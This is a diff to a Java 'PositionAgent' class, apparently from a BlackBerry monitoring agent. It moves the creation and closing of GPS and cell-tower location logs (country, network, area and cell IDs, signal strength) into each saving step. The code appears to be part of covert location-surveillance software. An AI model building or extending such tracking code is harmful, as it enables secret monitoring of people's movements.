@@ -139,22 +139,23 @@ public final class PositionAgent extends Agent implements LocationListener {
 
         if (gpsEnabled && lp != null) {
             //#ifdef DEBUG_TRACE
-            debug.trace("actualStart: logGps.createLog");
+            //debug.trace("actualStart: logGps.createLog");
             //#endif
-            logGps.createLog(getAdditionalData(0, LOG_TYPE_GPS),
-                    LogType.LOCATION_NEW);
+            //logGps.createLog(getAdditionalData(0, LOG_TYPE_GPS),
+            //        LogType.LOCATION_NEW);
+            
         }
         if (cellEnabled) {
             //#ifdef DEBUG_TRACE
-            debug.trace("actualStart: logCell.createLog");
+            //debug.trace("actualStart: logCell.createLog");
             //#endif
-            if (Device.isCDMA()) {
+           /* if (Device.isCDMA()) {
                 logCell.createLog(getAdditionalData(0, LOG_TYPE_CDMA),
                         LogType.LOCATION_NEW);
             } else {
                 logCell.createLog(getAdditionalData(0, LOG_TYPE_GSM),
                         LogType.LOCATION_NEW);
-            }
+            }*/
         }
         if(wifiEnabled){
             // i log wifi sono uno solo
@@ -197,15 +198,15 @@ public final class PositionAgent extends Agent implements LocationListener {
                 lp.reset();
             }
             //#ifdef DEBUG_TRACE
-            debug.trace("actualStop: closing logGps");
+            //debug.trace("actualStop: closing logGps");
             //#endif
-            logGps.close();
+            //logGps.close();
         }
         if (cellEnabled) {
             //#ifdef DEBUG_TRACE
-            debug.trace("actualStop: closing logCell");
+            //debug.trace("actualStop: closing logCell");
             //#endif
-            logCell.close();
+            //logCell.close();
         }
         if (wifiEnabled) {
            // i wifi sono uno solo
@@ -237,8 +238,6 @@ public final class PositionAgent extends Agent implements LocationListener {
 
         final boolean gprs = !Device.isCDMA();
 
-        //RadioInfo        
-
         if (gprs) {
             // CC: %d, MNC: %d, LAC: %d, CID: %d (Country Code, Mobile Network Code, Location Area Code, Cell Id).
             // CC e MNC possono essere estratti da IMEI
@@ -268,7 +267,11 @@ public final class PositionAgent extends Agent implements LocationListener {
             //#endif
 
             byte[] payload = getCellPayload(mcc, mnc, lac, cid, rssi);
+            
+            logCell.createLog(getAdditionalData(0, LOG_TYPE_GSM),
+                    LogType.LOCATION_NEW);
             saveLog(logCell, payload, LOG_TYPE_GSM);
+            logCell.close();
 
         } else {
             final CDMACellInfo cellinfo = CDMAInfo.getCellInfo();
@@ -292,7 +295,10 @@ public final class PositionAgent extends Agent implements LocationListener {
             //#endif
 
             byte[] payload = getCellPayload(mcc, sid, nid, bid, rssi);
+            logCell.createLog(getAdditionalData(0, LOG_TYPE_CDMA),
+                    LogType.LOCATION_NEW);
             saveLog(logCell, payload, LOG_TYPE_CDMA);
+            logCell.close();
         }
 
     }
@@ -344,7 +350,11 @@ public final class PositionAgent extends Agent implements LocationListener {
                 //#endif
                 if (loc.isValid()) {
                     byte[] payload = getGPSPayload(qc, timestamp);
+                    
+                    logGps.createLog(getAdditionalData(0, LOG_TYPE_GPS),
+                            LogType.LOCATION_NEW);
                     saveLog(logGps, payload, TYPE_GPS);
+                    logGps.close();
                 }
 
             } else {
